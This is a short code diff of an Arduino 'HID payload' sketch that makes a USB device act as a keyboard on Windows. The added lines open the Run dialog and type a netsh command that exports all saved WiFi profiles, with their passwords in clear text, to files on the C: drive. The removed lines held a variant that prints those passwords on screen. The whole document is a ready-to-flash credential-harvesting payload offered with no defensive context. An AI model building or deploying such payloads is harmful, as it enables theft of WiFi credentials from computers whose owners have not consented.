@@ -1,15 +1,15 @@
-// HID Payload 10: Extract WiFi Passwords
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("cmd /c netsh wlan show profile name=* key=clear");
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("cmd /T:01 /K \"netsh wlan export profile key=clear folder=C:\\ & exit\"");
+  Keyboard.println("color 4A");
 }
 
 void loop() {}
